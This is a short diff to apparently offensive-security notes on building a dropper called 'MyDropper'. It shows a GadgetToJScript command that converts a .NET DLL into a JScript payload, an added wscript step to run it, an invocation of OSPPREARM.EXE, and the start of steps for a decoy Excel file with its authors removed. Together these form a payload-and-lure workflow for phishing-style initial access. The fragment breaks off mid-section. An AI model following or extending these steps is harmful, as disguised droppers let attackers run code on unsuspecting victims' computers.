@@ -275,7 +275,15 @@ namespace MyDropper
 C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a .\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\deals\deals
 ```
 
+Test
+```powershell
+wscript C:\Payloads\deals\deals.js
+```
+
 ### Decoy + Trigger + Container
+
+ > & 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'
+
 1. Create decoy Excel spreadsheet file and save in deals directory
 	1. **Remove the authors from the document**
 ```
